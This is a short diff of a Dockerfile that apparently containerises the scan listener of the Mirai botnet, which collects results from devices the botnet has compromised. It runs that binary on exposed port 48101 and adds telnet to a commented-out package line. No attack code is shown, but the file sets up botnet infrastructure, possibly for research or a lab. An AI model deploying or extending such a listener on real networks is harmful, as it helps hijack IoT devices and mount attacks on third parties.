@@ -2,6 +2,6 @@ FROM debian:jessie-slim
 ADD ./source/mirai/debug/scanListen /scanListen
 RUN apt-get -y update
 #	&& apt-get upgrade -y \
-#	&& apt-get install -y wget bzip2 nano golang
+#	&& apt-get install -y wget bzip2 nano golang telnet
 CMD /scanListen
 EXPOSE 48101
